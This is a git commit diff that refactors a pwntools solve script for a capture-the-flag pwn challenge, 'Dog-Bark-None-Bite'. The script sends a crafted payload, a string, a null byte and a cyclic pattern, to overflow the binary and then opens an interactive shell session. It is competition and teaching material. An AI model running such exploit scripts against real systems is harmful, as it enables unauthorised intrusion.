1e199aa7d53d7d7395a4b71c5773fbb68691786a
Hoa Ly Van Huu (mthz72) <140467296+hoalvh@users.noreply.github.com>
2026-01-26 12:45:22 +0700

    Update connection logic and add debug context
    Refactor connection handling and improve logging.

--- VSL-CTF 2026/PWN/Dog-Bark-None-Bite/solve_chall.py
+++ VSL-CTF 2026/PWN/Dog-Bark-None-Bite/solve_chall.py
@@ -1,27 +1,52 @@
 #!/usr/bin/env python3
 from pwn import *
 
-context.binary = exe = ELF('./chall', checksec = False) 
+exe = ELF("./chall")
+context.binary = exe
+context.log_level = 'debug'
+context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]
 
-context.arch = 'amd64'
+# context.arch = 'amd64' 
 
-#p = process()
+# libc = ELF("./libc.so.6", checksec=False)
+# ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
 
 
-HOST = '14.225.212.104'
+gdbscript = '''
 
-PORT = 9010
+c
+'''
 
-p = remote(HOST, PORT)
+def conn():
+    
+    if args.REMOTE:
+        return remote("HOST_ADDRESS", 1337)
+    
+    elif args.GDB:
+        return gdb.debug([exe.path], gdbscript=gdbscript)
+    
+    else:
+        
+        # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
+        
+        return process([exe.path])
 
- 
+p = conn()
 
+def sla(delim, data): return p.sendlineafter(delim, data)
+def sa(delim, data):  return p.sendafter(delim, data)
+def sl(data):         return p.sendline(data)
+def s(data):          return p.send(data)
+def ru(delim):        return p.recvuntil(delim)
+def rl():             return p.recvline()
+def r(n):             return p.recv(n)
+
+# --- Exploit ---
+
+# Payload 
 payload = b"President" + b'\x00' + cyclic(22)
 
 
-p.sendafter(b'name: \n', payload)
-
-
+sa(b'name: \n', payload)
 
 p.interactive()
-
